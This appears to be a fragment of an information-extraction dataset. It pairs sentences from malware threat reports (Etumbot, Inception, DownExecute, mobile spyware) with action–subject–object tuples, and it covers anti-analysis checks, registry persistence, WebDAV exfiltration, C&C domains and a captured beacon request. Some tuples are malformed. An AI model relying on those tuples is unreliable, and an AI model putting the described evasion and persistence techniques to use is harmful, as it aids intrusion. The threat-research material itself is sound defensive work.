C&C is online, the decoded response payload will contain the RC4 key that is used to encrypt\nsubsequent communication": [{"is used": {"A": "is used", "O": ["to encrypt subsequent communication", "the RC4 key"]}}], " [1] A previous campaign using IXESHE malware was highlighted in 2012; the group\nused targeted emails with malicious PDF attachments to compromise East Asian governments,\nTaiwanese electronics manufacturers, and a telecommunications company": [{"used": {"A": "used", "S": "the group", "O": ["to compromise East Asian governments, Taiwanese electronics manufacturers, and a telecommunications company", "targeted emails with malicious PDF attachments"]}}], " The ka4281x3.log file is then\ndeleted": [{"deleted": {"A": "deleted", "O": ["The ka4281x3.log file"]}}], " The data is sent back to the C&C via the URI\n/article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data>": [{"is sent back": {"A": "is sent back", "O": ["The data", "via the URI /article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data>", "to the C&C"]}}], " Other\ndomains registered in this name have also been used\nas C&C for IXESHE:\n\n securezone[.]yesplusno[.]com [10]\n prishmobile[.]googlesale[.]net\n yahoopush[.]googlesale[.]net\n\nThe IP address 98.188.111.244 has also been used as\na C&C for multiple IXESHE samples, beginning in at\nleast March 2013 and observed as recently as March                                                                                \n2014 with an Etumbot sample": [{"been used": {"A": "been used", "O": ["for multiple IXESHE samples", "The IP address 98.188.111.244", "as a C&C"]}}], "\n\nA contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as\nfollows:\n\n         WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147|\n\n<caption>A bot registration call to /image</caption>\n\n<figure></figure>\n\n\nOnce the bot has registered with the C&C, it will send periodic pings to ask for new commands to\nexecute": [{"registered": {"A": "registered", "S": "the bot", "O": ["with the C&C"]}, "send": {"A": "send", "S": "the bot", "O": ["periodic pings"]}}], " The first is a dropper which contains the backdoor binary (the\nsecond component) and the distraction file": [{"contains": {"A": "contains", "S": "a dropper", "O": ["the backdoor binary (the second component) and the distraction file"]}}], "                                                               5\n</footer>\n\f\n<header>Arbor Security Report: ASERT Threat Intelligence Brief 2014-07</header>\n\n\n\n\nEtumbot discovers the proxy settings of the local machine": [{"discovers": {"A": "discovers", "S": "Etumbot", "O": ["the proxy settings of the local machine"]}}], "\n</section>\n\n<section>\n<header>Use of Byte Strings Technique (aka \u201cString Stacking\u201d)</header>\nEtumbot uses a technique to load strings into memory that has been called \u201cbyte strings\u201d and also \u201cstring\nstacking\u201d whereby character values are loaded into a specific memory location one byte at a time": [{"load": {"A": "load", "S": "Etumbot", "O": ["strings into memory that has been called \u201cbyte strings\u201d and also \u201cstring stacking\u201d"]}}], "\n\nMost Etumbot samples observed by ASERT drop decoy documents (PDFs, Word Documents, and Excel\nSpreadsheets) written in Traditional Chinese and usually pertaining to Cross-Strait or Taiwanese\nGovernment interests": [{"drop": {"A": "drop", "S": "Most Etumbot samples observed by ASERT", "O": ["decoy documents (PDFs, Word Documents, and Excel Spreadsheets) written in Traditional Chinese and usually pertaining to Cross-Strait or Taiwanese Government interests"]}}], " kb71271.log is\nthen deleted": [{"is then deleted": {"A": "is then deleted", "O": ["kb71271.log"]}}], "\n\nBefore\u00a0execution,\u00a0the\u00a0malware\u00a0makes\u00a0a\u00a0couple\u00a0of\u00a0checks\u00a0to\u00a0avoid\u00a0analysis,\u00a0including\u00a0checking\u00a0for\u00a0the\npresence\u00a0of\u00a0a\u00a0debugger\u00a0using\u00a0IsDebuggerPresent\u00a0as\u00a0well\u00a0as\u00a0checking\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0VirtualBox\u00a0by\nlooking\u00a0for\u00a0the\u00a0device\u00a0name\u00a0\\\\.\\VBoxMiniRdrDN:\n\n\u00a0\n\n\n\n\nThe\u00a0malware\u00a0also\u00a0checks\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0several\u00a0anti\u00advirus\u00a0solutions,\u00a0as\u00a0well\u00a0for\u00a0any\u00a0processes\nincluding\u00a0the\u00a0word\u00a0\u2018security\u2019:\n\fThe\u00a0malware\u00a0then\u00a0proceeds\u00a0to\u00a0decrypt\u00a0some\u00a0basic\u00a0configuration\u00a0data,\u00a0including\u00a0the\u00a0command\u00a0&\u00a0control\ndomain,\u00a0and\u00a0information\u00a0about\u00a0the\u00a0origin\u00a0of\u00a0the\u00a0infection,\u00a0tracked\u00a0via\u00a0ID:\n\n\u00a0\u00a0\n\n\n\n\nMeanwhile,\u00a0the\u00a0malware\u00a0begins\u00a0calling\u00a0home,\u00a0whilst\u00a0also\u00a0keeping\u00a0a\u00a0log\u00a0of\u00a0its\u00a0actions": [{"begins": {"A": "begins", "S": "the\u00a0malware", "O": ["calling\u00a0home"]}, "keeping": {"A": "keeping", "S": "the\u00a0malware", "O": ["a\u00a0log\u00a0of\u00a0its\u00a0actions", "in a\u00a0plaintext\u00a0file that\u00a0is\u00a0created\u00a0in\u00a0the\u00a0same\u00a0folder\u00a0as\u00a0where\u00a0the\u00a0binary\u00a0was\u00a0executed\u00a0from"]}}], "\n\nBefore\u00a0execution,": [{"makes": {"A": "makes", "S": "the\u00a0malware", "O": ["a\u00a0couple\u00a0of\u00a0checks", "to avoid\u00a0analysis"]}}], "\n\nBefore\u00a0execution,\u00a0the\u00a0malware\u00a0makes\u00a0a\u00a0couple\u00a0of\u00a0checks\u00a0to\u00a0avoid\u00a0analysis,\u00a0including\u00a0checking\u00a0for\u00a0the\npresence\u00a0of\u00a0a\u00a0debugger\u00a0using\u00a0IsDebuggerPresent\u00a0as\u00a0well\u00a0as\u00a0checking\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0VirtualBox\u00a0by\nlooking\u00a0for\u00a0the\u00a0device\u00a0name\u00a0\\\\.\\VBoxMiniRdrDN:\n\n\u00a0\n\n\n\n\nThe\u00a0malware\u00a0also\u00a0checks\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0several\u00a0anti\u00advirus\u00a0solutions,": [{"also\u00a0checks": {"A": "also\u00a0checks", "S": "The\u00a0malware", "O": ["as\u00a0well\u00a0for any\u00a0processes including\u00a0the\u00a0word\u00a0\u2018security\u2019", "for the\u00a0presence\u00a0of\u00a0several\u00a0anti\u00advirus\u00a0solutions"]}}], "\n</section>\n\n<section>\n\u00a0\n<heading> \fAfter\u00a0successful\u00a0compromise\u2026 </heading>\n\nIt\u00a0appears\u00a0as\u00a0though\u00a0the\u00a0clue\u00a0for\u00a0the\u00a0main\u00a0functionality\u00a0of\u00a0this\u00a0malware\u00a0is\u00a0in\u00a0its\u00a0name\u00a0(it\u00a0downloads,\u00a0and\nthen\u00a0executes)\u00a0files,\u00a0as\u00a0it\u00a0offers\u00a0little\u00a0else\u00a0for\u00a0the\u00a0attacker.\u00a0The\u00a0DownExecute\u00a0malware\u00a0is\u00a0used\u00a0as\u00a0a\u00a0way\nfor\u00a0the\u00a0attackers\u00a0to\u00a0gain\u00a0an\u00a0initial\u00a0foothold\u00a0on\u00a0the\u00a0victim\u00a0machine.\u00a0The\u00a0basic\u00a0information": [{"reported\u00a0back": {"A": "reported\u00a0back", "S": "the\u00a0malware", "O": ["The\u00a0basic\u00a0information"]}}], "\n</section>\n\n<section>\n\u00a0\n<heading> \fAfter\u00a0successful\u00a0compromise\u2026 </heading>\n\nIt\u00a0appears\u00a0as\u00a0though\u00a0the\u00a0clue\u00a0for\u00a0the\u00a0main\u00a0functionality\u00a0of\u00a0this\u00a0malware\u00a0is\u00a0in\u00a0its\u00a0name\u00a0(it": [{"executes": {"A": "executes", "S": "it"}, "downloads": {"A": "downloads", "S": "it"}}], "\n</section>\n\n\n\n<footer>37</footer>\n\f\n<section>\n<heading>Mobile malware: Android</heading>\n\n\nAccessing the link from an Android User-Agent initiated a download of an\nAndroid installer package named WhatsAppUpdate.apk": [{"initiated": {"A": "initiated", "S": "Accessing the link from an Android User-Agent", "O": ["a download of an Android installer package named WhatsAppUpdate.apk"]}}], "\n\ntail- serves as a SOCKS proxy for the attackers": [{"serves": {"A": "serves", "S": "tail-", "O": ["as a SOCKS proxy", "for the attackers"]}}], "\n\nThe encrypted files uploaded to the WebDAV shares come with their InitVectors\nstored at the end of the file": [{"uploaded": {"A": "uploaded", "O": ["to the WebDAV shares", "The encrypted files"]}}], "\nThe survey is then uploaded to the server in a specified folder with the generated\nname": [{"is then uploaded": {"A": "is then uploaded", "O": ["with the generated name", "The survey", "in a specified folder", "to the server"]}}], "\nRecordings are stored as *.mp4 files, and uploaded to the attackers periodically": [{"uploaded": {"A": "uploaded", "O": ["periodically", "to the attackers", "Recordings"]}, "are stored": {"A": "are stored", "O": ["as *.mp4 files", "Recordings"]}}], " The framework is notable for a number of reasons, including (but not\nlimited to) its use of a cloud-based infrastructure for command-and-control and its\nuse of the WebDAV protocol to send instructions and receive exfiltrated\ninformation from compromised systems": [{"use": {"A": "use", "S": "The framework", "O": ["the WebDAV protocol", "to send instructions"]}}], "\n\nThe binary also checks a separate folder on the cloud service designated to\ncontain new configuration information": [{"checks": {"A": "checks", "S": "The binary", "O": ["a separate folder on the cloud service designated to contain new configuration information"]}}], "\n</list>\n\n\n\n<footer>41</footer>\n\f\nThese data are encrypted and uploaded to an FTP account which is taken from\nan encrypted configuration file named /usr/bin/cores": [{"uploaded": {"A": "uploaded", "O": ["to an FTP account", "These data"]}, "are encrypted": {"A": "are encrypted", "O": ["These data"]}}], "\n</section>\n\n\n\n<footer>46</footer>\n\f\n<section>\n<heading>The Chinese connection</heading>\n\nOn at least two occasions during our surveillance of the Inception framework, the\nmalware downloaded something unexpected and wholly different from what we\nhave discussed until now": [{"downloaded": {"A": "downloaded", "S": "the malware", "O": ["something unexpected and wholly different from what we have discussed until now"]}}], "\n</list>\nAfter a router SOCKSS port was opened by Unlocker, this IP would connect to\nthe opened port and tunnel its email traffic through the router": [{"connect": {"A": "connect", "S": "this IP", "O": ["to the opened port"]}, "tunnel": {"A": "tunnel", "S": "this IP", "O": ["through the router", "its email traffic"]}}], "\n\nFirst of all, we have the decoy documents which indicate an interest in:\n<list>\n   -   Embassies\n   -   Politics\n   -   Finance\n   -   Military\n   -   Engineering\n</list>\nWe also have a set of phishing mails, which were targeted at:\n<list>\n   -   The finance sector in Russia\n   -   The oil and energy industry in Romania, Venezuela, and Mozambique\n   -   Embassies and diplomats from various countries\n</list>\n\n</section>\n\n<footer>10</footer>\n\f\n<section>\n<heading>Shellcode</heading>\n\n\nThe shellcode used is a pretty standard variant previously used by a number of\ncampaigns typically operating out of China, but with some minor changes": [{"have": {"A": "have", "S": "We", "O": ["a set of phishing mails"]}}, {"have": {"A": "have", "S": "we", "O": ["the decoy documents"]}}], "\n\n              The attackers utilize compromised embedded devices \u2013 typically routers- on the\n              Internet as well as multiple dedicated hosting providers and VPN services to\n              mask their identity from the cloud storage provider and others": [{"utilize": {"A": "utilize", "S": "The attackers", "O": ["compromised embedded devices \u2013 typically routers- on the Internet as well as multiple dedicated hosting providers and VPN services", "to mask their identity from the cloud storage provider and others"]}}], " This seems adapted from Microsoft example code, like\nthe one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx\n\n<figure></figure>\n\n\nWhen the VBSript is run it drops two files to disk": [{"drops": {"A": "drops", "S": "it", "O": ["to disk", "two files"]}}], " It is a downloader and remote shell program,\ndesigned to connect to a C&C server to interact with the attacker and/or\ndownload more malware": [{"is": {"A": "is", "S": "It", "O": ["remote shell program"]}, "connect": {"A": "connect", "S": "It", "O": ["to interact with the attacker", "to a C&C server"]}, "download": {"A": "download", "S": "It", "O": ["more malware"]}}], "\n\nThis configuration information is used to load the encrypted file into memory and\ndecrypt it": [{"load": {"A": "load", "S": "This configuration information", "O": ["the encrypted file", "into memory"]}}], " All of this is encrypted and then\nsent to cloud storage via WebDAV": [{"is encrypted": {"A": "is encrypted", "O": ["All of this"]}, "sent": {"A": "sent", "O": ["to cloud storage", "via WebDAV", "All of this"]}}], " This data file\nturns out to be encrypted using AES-256": [{"be encrypted": {"A": "be encrypted", "O": ["using AES-256", "This data file"]}}], "\n\nFiles are compressed using a modified LZMA-compression and encrypted using\nAES cipher-block-chaining (CBC) before being uploaded to the cloud server": [{"are compressed": {"A": "are compressed", "O": ["Files", "using a modified LZMA-compression"]}, "encrypted": {"A": "encrypted", "O": ["Files", "using AES cipher-block-chaining (CBC)"]}, "being uploaded": {"A": "being uploaded", "O": ["to the cloud server", "Files"]}}], " The malware\nalso checks configured subfolders for updates; and if these are found they will be\ndownloaded, decrypted and used as appropriate": [{"checks": {"A": "checks", "S": "The malware", "O": ["configured subfolders", "for updates"]}}, {"be downloaded": {"A": "be downloaded", "O": ["they"]}}], " All\nof this information is exfiltrated back via the same WebDAV connection": [{"is exfiltrated": {"A": "is exfiltrated", "O": ["All of this information", "back via the same WebDAV connection"]}}], "\nThe order, size, and locations of these segments vary from build to build but\nsomewhere near the end of the large function there will be a call to a subfunction\nthat loads the PE image into memory, followed by a call to free the PE image\nallocation from memory": [{"free": {"A": "free", "S": "a call", "O": ["the PE image allocation", "from memory"]}}, {"loads": {"A": "loads", "S": "a call to a subfunction", "O": ["the PE image", "into memory"]}}], "\n\n</section>\n\n\n<footer>22</footer>\n\f\n<section>\n<heading>The Sheep and the Wolves</heading>\n\nVictims of this attack will connect using the Windows WebDAV redirector, and\nthe HTTP request user-agent string will reflect this": [{"connect": {"A": "connect", "S": "Victims of this attack", "O": ["using the Windows WebDAV redirector"]}}], "\n\nWe identified four IP addresses that connected to the proxy malware:\n<list>\nCloud enumerator:\nApparently a rented server at AS34224 NETERRA-AS, Bulgaria\n</list>\nThis host belongs to a Bulgarian VPS service and would use the router proxy to\nconnect to webdav.cloudme.com": [{"use": {"A": "use", "S": "This host", "O": ["the router proxy", "to connect to webdav.cloudme.com"]}}, {"connected": {"A": "connected", "S": "four IP addresses", "O": ["to the proxy malware"]}}], "\n</list>\nTraffic from this IP had a very specific purpose: It unlocked routers for proxying in\nconnection with the sending of phishing emails": [{"unlocked": {"A": "unlocked", "S": "It", "O": ["in connection with the sending of phishing emails", "for proxying", "routers"]}}], "\n\nRegardless of whether the registry launches the DLL or when another malware\nexecutable starts the DLL directly, the DLL is launched using regsrv32.exe with\nthe /s (silent) option": [{"is launched": {"A": "is launched", "O": ["using regsrv32.exe", "with the /s (silent) option", "the DLL"]}}], " The\nmalicious content is stored inside the document in encoded form, and the\nshellcode decodes and writes this to disk": [{"is stored": {"A": "is stored", "O": ["in encoded form", "The malicious content", "inside the document"]}}, {"writes": {"A": "writes", "S": "the shellcode", "O": ["to disk", "this"]}}], " It is designed as a survey tool": [{"is designed": {"A": "is designed", "O": ["as a survey tool", "It"]}}], " \u2013 clearly randomized in\norder to avoid detection by name": [{"randomized": {"A": "randomized", "S": "the names of the dropped files", "O": ["in order to avoid detection by name"]}}], "\n</section>\n\n\n\n<footer>40</footer>\n\f\n<section>\n<heading>Mobile malware: Apple IOS</heading>\n\n\nUsing an IOS User-Agent triggered the download of a Debian installer package,\nWhatsAppUpdate.deb, also 1.2Mb in size": [{"triggered": {"A": "triggered", "S": "Using an IOS User-Agent", "O": ["the download of a Debian installer package, WhatsAppUpdate.deb"]}}], " The same router\n              botnet is used as a spreading and management platform for attacks on mobile\n              devices as well": [{"is used": {"A": "is used", "O": ["as a spreading and management platform for attacks on mobile devices", "The same router botnet"]}}], " When executed it will rebuild the original dll\n(95Num3p3gm.dll, presumably), load it from memory and pass over execution": [{"load": {"A": "load", "O": ["it", "from memory"]}}], " This host does all scanning of webdav shares\nfor stolen user data, and also uploads new malware components": [{"uploads": {"A": "uploads", "S": "This host", "O": ["new malware components"]}}], " They are lightweight and intended to pull specific\nsurvey information from their target": [{"pull": {"A": "pull", "S": "They", "O": ["from their target", "specific survey information"]}}], "\n\n921.bin retrieves several datapoints about the infected machine: Domain info; a\nlist of running processes with all loaded modules in each; the list of installed\nsoftware; and a complete hardware profile of the target machine": [{"retrieves": {"A": "retrieves", "S": "921.bin", "O": ["Domain info"]}}], " Immediately\nafter, the newly opened port would be connected to by another IP and used to\nsend phishing emails with malicious attachments": [{"be connected": {"A": "be connected", "S": "another IP", "O": ["to the newly opened port"]}}, {"send": {"A": "send", "S": "the newly opened port", "O": ["phishing emails with malicious attachments"]}}], "\n\nThe malware is able to collect a lot of other information, not all of which is\nactually used:\n<list>\n   \u2022   Account data\n   \u2022   Location\n   \u2022   Contacts\n   \u2022   External and Internal Storage (files written)\n   \u2022   Audio (microphone)\n   \u2022   Outgoing calls\n   \u2022   Incoming calls\n   \u2022   Call log\n   \u2022   Calendar\n   \u2022   Browser bookmarks\n   \u2022   Incoming SMS\n</list>\nThrough the encrypted C&C protocol, the attackers can issue commands and\nbinary updates to the malware": [{"issue": {"A": "issue", "S": "the attackers", "O": ["Through the encrypted C&C protocol", "commands and binary updates", "to the malware"]}}, {"collect": {"A": "collect", "S": "The malware", "O": ["a lot of other information"]}}], "\nThe PE file gathers system information including OS version, computer name,\nuser name, user group membership, the process it is running in, locale ID\u2019s, as\nwell as system drive and volume information": [{"gathers": {"A": "gathers", "S": "The PE file", "O": ["the process it is running in"]}}], " The file creation times turned out to\nbe hours after the files themselves were uploaded to the WebDAV share": [{"were uploaded": {"A": "were uploaded", "O": ["the files themselves", "to the WebDAV share"]}}], "\n\nIn the wild we observed this IP connect to our router on the malware\nmanagement port and specify a SOCKSS proxy port to be opened": [{"connect": {"A": "connect", "S": "this IP", "O": ["to our router", "on the malware management port"]}}], "\n\nWhen connecting to this server, sccm.exe issues the following request:\n\n<figure>\nPOST /check.jsp HTTP/1.1\nAccept: */*..Accept-Language:en-us\nContent-Type: application/octet-stream\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nHost: www.antivir.com\nContent-Length: 8\nConnection: Keep-Alive\nCache-Control: no-cache\n</figure>\n\nThis C&C domain is used by many other malwares related to sccm.exe; some of\nwhich share obvious connections to the Quarian malware family, a known APT\nintrusion tool": [{"connecting": {"A": "connecting", "S": "sccm.exe", "O": ["to this server"]}}, {"is used": {"A": "is used", "S": "many other malwares related to sccm.exe", "O": ["This C&C domain"]}}], " The polymorphing\nmechanism also generates, and inserts, unique functions all of which make calls\nto different floating-point operations \u2013 all done just to obfuscate the actual\ndecoding process": [{"obfuscate": {"A": "obfuscate", "S": "The polymorphing mechanism", "O": ["the actual decoding process"]}}], " The Word document is displayed to the user to avoid arousing any\nsuspicion while the script is executed in the background": [{"is executed": {"A": "is executed", "O": ["the script", "in the background"]}}], "\n</section>\n\n\n\n<footer>32</footer>\n\f\n<cover>\n<heading>\nPART III:\n\nAttacks on mobile devices\n</heading>\n</cover>\n\n\n\n<footer>33</footer>\n\f\n<section>\nOne of the spearphishing mails we observed coming through the router network\nwas this one, sent to an address under the gov.py (Government of Paraguay)\ndomain": [{"coming": {"A": "coming", "S": "One of the spearphishing mails", "O": ["through the router network"]}}, {"sent": {"A": "sent", "O": ["to an address under the gov.py (Government of Paraguay) domain", "One of the spearphishing mails"]}}], " In that\nparticular case we had the actual phishing email, so we knew the apparent\nrecipient \u2013 the CEO of a large Russian bank": [{"had": {"A": "had", "S": "we", "O": ["the actual phishing email"]}}], "\n\nThe C&C server in this case is ict32.msname.org": [{"is": {"A": "is", "S": "The C&C server", "O": ["ict32.msname.org"]}}], "\nAfter being proxied though the router, each of these would authenticate with one\nof the dedicated mail proxies and send out phishing attacks": [{"send": {"A": "send", "S": "each of these", "O": ["out phishing attacks"]}}], "\n\n\n\n\n<footer>12</footer>\n\f\nThe files will be installed in several locations:\n<list>\n%WinDir%,            ex": [{"be installed": {"A": "be installed", "O": ["in several locations", "The files"]}}], "\n\n<figure></figure>\n\n\n<caption>Above: The decoding loop</caption>\n\n\nUpon successful execution this code drops a Word document and a Visual Basic\nscript": [{"drops": {"A": "drops", "S": "this code", "O": ["a Word document and a Visual Basic script"]}}], " This allows the attackers to uniquely identify every\ntargeted attack and track how successful each phishing campaign is": [{"identify": {"A": "identify", "S": "the attackers", "O": ["every targeted attack"]}}], " Not only is the initial DLL apparently\n              polymorphed using some backend tool \u2013 the compile time stamps in the PE\n              header are clearly forged, resources are removed so as not to give away any\n              location information, and import tables are shuffled around, rendering import\n              hashes (aka imphashes) useless": [{"polymorphed": {"A": "polymorphed", "O": ["using some backend tool", "the initial DLL"]}}], "\n\n\n\n\n<footer>31</footer>\n\f\nThe email shown above was one of a number of messages sent to targets in the\noil industry": [{"sent": {"A": "sent", "O": ["to targets in the oil industry", "a number of messages"]}}], " Once received the malware would attempt to connect to the\ndomain name on the specified port and would start tunneling all traffic received\nfrom the SOCKSS port to the destination and vise-versa": [{"tunneling": {"A": "tunneling", "S": "the malware", "O": ["to the destination", "all traffic received from the SOCKSS port"]}, "connect": {"A": "connect", "S": "the malware", "O": ["to the domain name", "on the specified port"]}}], " They are executed in memory\nonly, and once they have completed the memory is freed": [{"is freed": {"A": "is freed", "O": ["once they have completed", "the memory"]}}, {"are executed": {"A": "are executed", "O": ["in memory", "They"]}}], " Instead, when\nthey are executed they are passed a pointer to a function to use for sending data\nback home": [{"are passed": {"A": "are passed", "O": ["a pointer to a function", "to use for sending data back home", "they"]}}], " They turned out\nto belong to a highly advanced and professional targeted attack framework,\nwhich utilized a complex series of techniques to survey potential targets": [{"utilized": {"A": "utilized", "S": "a highly advanced and professional targeted attack framework", "O": ["to survey potential targets", "a complex series of techniques"]}}], " The mail proxy would then relay the spearphishing mail as\nseen below": [{"relay": {"A": "relay", "S": "The mail proxy", "O": ["as seen below", "the spearphishing mail"]}}], " This collects:\n<list>\n   \u2022   deviceName, manufacturerName\n   \u2022   platformVersion, softwareVersion\n   \u2022   brandVendorId, brandVersion\n   \u2022   total and free flash size of the device\n   \u2022   amount of memory/storage already allocated\n   \u2022   ownerName, ownerInformation\n   \u2022   Phone mumber\n   \u2022   PIN\n   \u2022   IMSI\n   \u2022   IMEI\n   \u2022   mcc and mnc (Mobile Carrier ID)\n   \u2022   cellID\n   \u2022   Location area code\n   \u2022   isPasswordEnabled\n   \u2022   Battery data (level, temperature, voltage, etc)\n   \u2022   Installed applications\n   \u2022   Address book\n   \u2022   APChannel\n   \u2022   Connected Network Type\n   \u2022   BSSID\n   \u2022   DataRate\n   \u2022   Profile Name\n   \u2022   RadioBand\n   \u2022   SecurityCategory\n   \u2022   SignalLevel\n   \u2022   SSID\n</list>\nCollected data will be uploaded to a DynDNS domain currently hosted on a US\nwebhosting service": [{"collects": {"A": "collects", "S": "This"}}, {"be uploaded": {"A": "be uploaded", "O": ["to a DynDNS domain currently hosted on a US webhosting service", "Collected data"]}}], " If such a file is present on the server, the\nmalware downloads the new configuration file then deletes it from the server": [{"deletes": {"A": "deletes", "S": "the malware", "O": ["it", "from the server"]}, "downloads": {"A": "downloads", "S": "the malware", "O": ["the new configuration file"]}}], "\n\nThese files were downloaded as encrypted *.bin files from the accounts\ncarter0648 and frogs6352": [{"were downloaded": {"A": "were downloaded", "O": ["from the accounts carter0648 and frogs6352", "as encrypted *.bin files", "These files"]}}], "\nAdditionally, once the resource is established, the malware can transfer files to\nand from the command and control servers using standard file IO commands": [{"transfer": {"A": "transfer", "S": "the malware"}}], "\n\nThe VBScript then sets a startup key in the\n\u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u201d registry path to\nexecute the DLLs at boot time": [{"execute": {"A": "execute", "S": "a startup key", "O": ["the DLLs", "at boot time"]}}, {"sets": {"A": "sets", "S": "The VBScript", "O": ["a startup key", "in the \u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u201d registry path"]}}], " It\nseems that because the plugins exist in memory only, they are injected daily to\nensure persistence on victim computers": [{"are injected": {"A": "are injected", "O": ["to ensure persistence on victim computers", "they", "daily"]}}], "\n\n\nOnce installed, it may collect\n<list>\n   \u2022   Device platform, name, model, system name, system version\n   \u2022   ICCID\n   \u2022   User\u2019s address book\n   \u2022   Roaming status\n   \u2022   Phone number\n   \u2022   Carrierbundlename\n   \u2022   Iso country name\n   \u2022   Carrier name\n   \u2022   Wifi status\n   \u2022   MAC address\n   \u2022   Device battery level\n   \u2022   Free and total space\n   \u2022   Cpu frequency and count\n   \u2022   Total and user memory\n   \u2022   Maxsocketbuffersize\n   \u2022   Language local identifier and language display name\n   \u2022   Default and local time zone\n   \u2022   Account data: AccountAvailableServiceTypes, AccountKind,\n       AccountSocialEnabled, etc\n   \u2022   AppleID\n   \u2022   CreditDisplayString\n   \u2022   DSPersonID\n   \u2022   IOS specific data; ex LastBackupComputerName,\n       LastBackupComputerType, iTunes.store-UserName, iTunes.store-\n       downloaded-apps etc": [{"collect": {"A": "collect", "S": "it"}}], " The communication\nbetween the attacker and the SOCKSS is encoded using the RC4 key": [{"is encoded": {"A": "is encoded", "O": ["The communication between the attacker and the SOCKSS", "using the RC4 key"]}}], " As with other plugins, these are downloaded and deleted from the\nshare in one go": [{"deleted": {"A": "deleted", "O": ["these", "from are downloaded these", "in are downloaded these"]}, "are downloaded": {"A": "are downloaded", "O": ["these", "from deleted these", "in deleted these"]}}], " 922.bin\ncompiles a dirwalk \u2013 a complete listing of every file path \u2013 of each fixed drive": [{"compiles": {"A": "compiles", "S": "922.bin", "O": ["a dirwalk \u2013 a complete listing of every file path \u2013 of each fixed drive"]}}], "\nExploitation of vulnerabilities in this file format is leveraged to gain remote access\nto victim\u2019s computers": [{"is leveraged": {"A": "is leveraged", "O": ["to gain remote access to victim\u2019s computers", "Exploitation of vulnerabilities in this file format"]}}], "\n\nThe apparent main purpose of this malware is to record phone call audio": [{"record": {"A": "record", "S": "this malware", "O": ["phone call audio"]}}], "\n\nUpon execution the binary uses its hardcoded key to decrypt the configuration\nsection and retrieve the listening port to use for incoming connections": [{"retrieve": {"A": "retrieve", "S": "the binary", "O": ["the listening port", "to use for incoming connections"]}}], " When decrypted, these turned out to be dropper\npackages containing one dropper executable clearly created for the Inception\nframework, and one other, very different executable": [{"containing": {"A": "containing", "S": "dropper packages", "O": ["one dropper executable clearly created for the Inception framework, and one other, very different executable"]}}], " In this account there was hidden another encrypted\nconfiguration file which the malware downloaded and decrypted": [{"downloaded": {"A": "downloaded", "S": "the malware", "O": ["another encrypted configuration file"]}}], " This document\nwas presumably obtained by the attackers and repurposed for the attack": [{"was presumably obtained": {"A": "was presumably obtained", "S": "the attackers"}, "repurposed": {"A": "repurposed", "S": "the attackers", "O": ["for the attack"]}}], " Most interaction between attackers and their infrastructure is\nperformed via a convoluted network of router proxies and rented hosts": [{"is performed": {"A": "is performed", "O": ["via a convoluted network of router proxies and rented hosts", "Most interaction between attackers and their infrastructure"]}}], "\nCommon across multiple accounts, multiple IP\u2019s, and over time, is that the\nprobable attackers have used a HTTP user-agent of \u201cdavfs2/1.4.6 neon/0.29.6\u201d": [{"used": {"A": "used", "S": "the probable attackers", "O": ["a HTTP user-agent of \u201cdavfs2/1.4.6 neon/0.29.6\u201d"]}}], "\n\nThen there is the C&C domain used": [{"used": {"A": "used", "O": ["the C&C domain"]}}], " Inception has the capacity to perform all steps needed for scouting\nout and exfiltrating data without resorting to traditional hosted command &\ncontrol": [{"scouting": {"A": "scouting", "S": "Inception"}, "exfiltrating": {"A": "exfiltrating", "S": "Inception"}}], " By using a well-understood APT tool and a known malicious C&C\ndomain name, the attackers permit much clearer attribution": [{"using": {"A": "using", "S": "the attackers", "O": ["a known malicious C&C domain name"]}}], "\n\n<figure></figure>\n\n\nIt is believed that the attackers were able to compromise these devices based on\npoor configurations or default credentials": [{"compromise": {"A": "compromise", "S": "the attackers", "O": ["these devices", "based on poor configurations or default credentials"]}}], " In some cases the organization from which the phishing\nemail originates would appear to be a known associate to the target": [{"appear": {"A": "appear", "S": "the organization from which the phishing email originates", "O": ["to be a known associate to the target"]}}], "\n\n\n<figure></figure>\n\n<caption>Above: Captured SMTP session, sending the malicious attachment MQ1474.doc</caption>\n\nThis way the attack can be mistaken to come from legitimate businesses and\ntrusted organizations": [{"be mistaken": {"A": "be mistaken", "O": ["the attack", "to come from legitimate businesses and trusted organizations"]}}], "\n\nThe application impersonates a settings utility": [{"impersonates": {"A": "impersonates", "S": "The application", "O": ["a settings utility"]}}], "\n\n\n\n<footer>29</footer>\n\f\nMail proxies:\n\nThrough our router monitoring we identified two mail proxies used by the\nattackers": [{"used": {"A": "used", "S": "the attackers", "O": ["two mail proxies"]}}], "\n\nThe framework, thus far, has been using the services of a cloud service provider\nbased in Sweden, CloudMe.com, for its main command-and-control\ninfrastructure": [{"been using": {"A": "been using", "S": "The framework", "O": ["the services of a cloud service provider based in Sweden, CloudMe.com", "for its main command-and-control infrastructure"]}}], "\n\nThis application impersonates a Cydia installer, and can only be installed on a\njailbroken phone": [{"impersonates": {"A": "impersonates", "S": "This application", "O": ["a Cydia installer"]}}], " Our theory is that this malware is a\nmore typical datastealer, and we have observed that after this type of file is\nplanted on the account, encrypted data uploads from compromised users\nincrease": [{"is": {"A": "is", "S": "this malware", "O": ["a more typical datastealer"]}}, {"increase": {"A": "increase", "S": "encrypted data uploads from compromised users"}}], " The HTML source code reveals that the encoded portion is\nencapsulated in blog-index tags:\n\n<figure></figure>\n\n\nThe three accounts contain different configuration blocks pointing to C&C servers\napparently located in Poland, Germany and Russia, respectively": [{"pointing": {"A": "pointing", "S": "different configuration blocks", "O": ["to C&C servers apparently located in Poland, Germany and Russia, respectively"]}}], " The one above\ndrops ctfmonrc.dll": [{"drops": {"A": "drops", "S": "The one above", "O": ["ctfmonrc.dll"]}}], " This means\nthat the attackers must maintain a list of where each of these implants are\ninstalled, as well as what port and key each is configured to use": [{"maintain": {"A": "maintain", "S": "the attackers", "O": ["a list of where each of these implants are installed, as well as what port and key each is configured to use"]}}], "\n\nThe framework is designed in such a way that all post-infection communication\n(i.e": [{"be performed": {"A": "be performed", "O": ["via the cloud service", "all post-infection communication 